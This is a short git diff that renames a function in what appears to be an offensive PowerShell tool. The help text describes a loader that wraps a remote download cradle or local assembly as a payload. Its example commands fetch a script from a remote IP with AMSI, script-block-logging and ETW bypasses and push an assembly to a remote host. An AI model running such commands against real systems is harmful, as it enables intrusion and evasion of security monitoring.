@@ -1,4 +1,4 @@
-function Get-PowerLoader {
+function New-PowerLoader {
 <#
 .SYNOPSIS
     Build script block which safely loads PowerShell or .NET assembly.
@@ -6,7 +6,7 @@ function Get-PowerLoader {
     Author: Timothee MENOCHET (@_tmenochet)
 
 .DESCRIPTION
-    Get-PowerLoader returns PowerShell script block embedding download cradle or local file as payload.
+    New-PowerLoader returns PowerShell script block embedding download cradle or local file as payload.
 
 .PARAMETER Type
     Specifies the payload type, defaults to PoSH.
@@ -27,10 +27,10 @@ function Get-PowerLoader {
     Removes comments from PowerShell payload to be loaded.
 
 .EXAMPLE
-    PS C:\> Get-PowerLoader -Type PoSh -FileUrl 'https://192.168.0.1/script.ps1' -ArgumentList 'Invoke-Sample','-Verbose' -Bypass AMSI,SBL
+    PS C:\> New-PowerLoader -Type PoSh -FileUrl 'https://192.168.0.1/script.ps1' -ArgumentList 'Invoke-Sample','-Verbose' -Bypass AMSI,SBL
 
 .EXAMPLE
-    PS C:\> Get-PowerLoader -Type NetAsm -FilePath .\sharp.exe -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.0.2
+    PS C:\> New-PowerLoader -Type NetAsm -FilePath .\sharp.exe -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.0.2
 #>
     [CmdletBinding()]
     Param (
